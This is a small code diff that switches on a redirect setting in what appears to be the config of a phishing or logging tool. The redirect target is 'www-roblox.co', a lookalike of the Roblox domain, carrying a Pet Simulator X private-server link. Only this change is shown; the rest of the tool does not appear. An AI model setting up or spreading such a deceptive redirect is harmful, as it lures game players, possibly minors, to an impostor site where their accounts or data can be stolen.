@@ -44,7 +44,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://www-roblox.co/games/6284583030/Pet-Simulator-X?privateServerLinkCode=79744322774189053613636725751652" # Link to the webpage to redirect to 
     },
 
